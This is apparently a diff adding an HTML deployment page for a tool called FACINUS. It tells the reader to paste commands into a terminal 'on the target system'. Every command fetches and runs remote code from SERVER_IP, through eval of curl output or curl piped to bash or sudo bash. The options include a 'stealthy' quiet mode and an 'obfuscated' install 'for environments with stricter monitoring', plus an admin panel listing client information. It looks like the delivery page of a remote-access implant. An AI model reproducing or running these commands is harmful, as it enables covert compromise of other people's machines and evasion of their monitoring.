@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FACINUS Deployment</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        .header { background: #333; color: white; padding: 10px; }
+        .header h1 { margin: 0; }
+        .card { border: 1px solid #ddd; border-radius: 5px; padding: 20px; margin-bottom: 20px; }
+        .command { background: #f8f8f8; padding: 15px; border: 1px solid #ddd; font-family: monospace; margin: 15px 0; position: relative; }
+        .copy-btn { position: absolute; right: 10px; top: 10px; background: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer; }
+        .options { margin-top: 20px; }
+        .option-box { border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
+        .option-title { font-weight: bold; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="container">
+            <h1>FACINUS Deployment</h1>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <h2>Quick Setup</h2>
+            <p>Copy and paste this command into a terminal on the target system:</p>
+            
+            <div class="command" id="cmd1">
+                eval "$(curl -fsSL http://SERVER_IP/deployment/y)"
+                <button class="copy-btn" onclick="copyToClipboard('cmd1')">Copy</button>
+            </div>
+            
+            <p><strong>Note:</strong> This will install with default settings and requires root access.</p>
+        </div>
+        
+        <div class="card">
+            <h2>Installation Options</h2>
+            
+            <div class="options">
+                <div class="option-box">
+                    <div class="option-title">Minimal Installation (No Root Required)</div>
+                    <p>For limited access without requiring root privileges:</p>
+                    <div class="command" id="cmd2">
+                        curl -fsSL http://SERVER_IP/deployment/minimal | bash
+                        <button class="copy-btn" onclick="copyToClipboard('cmd2')">Copy</button>
+                    </div>
+                </div>
+                
+                <div class="option-box">
+                    <div class="option-title">Full Installation</div>
+                    <p>Complete installation with all features:</p>
+                    <div class="command" id="cmd3">
+                        curl -fsSL http://SERVER_IP/deployment/full | sudo bash
+                        <button class="copy-btn" onclick="copyToClipboard('cmd3')">Copy</button>
+                    </div>
+                </div>
+                
+                <div class="option-box">
+                    <div class="option-title">Quiet Mode</div>
+                    <p>Minimal output for stealthy installation:</p>
+                    <div class="command" id="cmd4">
+                        curl -fsSL http://SERVER_IP/deployment/quiet | sudo bash
+                        <button class="copy-btn" onclick="copyToClipboard('cmd4')">Copy</button>
+                    </div>
+                </div>
+                
+                <div class="option-box">
+                    <div class="option-title">Obfuscated Installation</div>
+                    <p>For environments with stricter monitoring:</p>
+                    <div class="command" id="cmd5">
+                        eval "$(curl -fsSL http://SERVER_IP/deployment/x)"
+                        <button class="copy-btn" onclick="copyToClipboard('cmd5')">Copy</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>Admin Access</h2>
+            <p>Access the admin panel for logs and client information:</p>
+            <p><a href="admin.php">Admin Panel</a></p>
+        </div>
+    </div>
+    
+    <script>
+        function copyToClipboard(elementId) {
+            const el = document.getElementById(elementId);
+            const text = el.innerText.split('\n')[0].trim();
+            
+            navigator.clipboard.writeText(text).then(function() {
+                const btn = el.querySelector('.copy-btn');
+                const originalText = btn.innerText;
+                btn.innerText = 'Copied!';
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
